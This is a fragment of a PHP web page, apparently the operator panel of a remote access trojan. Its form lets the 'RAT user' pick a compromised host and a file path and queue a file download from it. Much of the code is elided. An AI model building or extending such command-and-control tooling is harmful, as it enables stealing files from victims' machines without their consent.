  ...
  <body>
        ...
        <div class="container">
          ...
          <div class="nav-collapse collapse">
            <ul class="nav">
              ...
              <li class="active"><a ref="download.php">Task File Download</a></li>
    ...
    <div class="container">
      <form role="form" class="form-inline" method="post">Host:&ensp;&ensp; 
        ...
        ?>
        </select>&ensp;File Path:&ensp;&ensp;	
        <input type="text" class="form-control" name="downloadPath">&ensp;
        <button type="submit" class="btn btn-primary">Task File Download</button>
      </form>
      <?php
        # Did the RAT user select "Task File Download"
        if (isset($_POST["hostname"]) && !empty($_POST["hostname"]) && isset($_POST["downloadPath"]) && !empty($_POST["downloadPath"]))
        {
          $hostname = $_POST["hostname"]; # Saves hostname to task file download
          $filePath = $_POST["downloadPath"]; # Saves file path to download
          ...
          header("Location: downloadSubmit.php");
        }
      ?>
    </div> <!-- /container -->
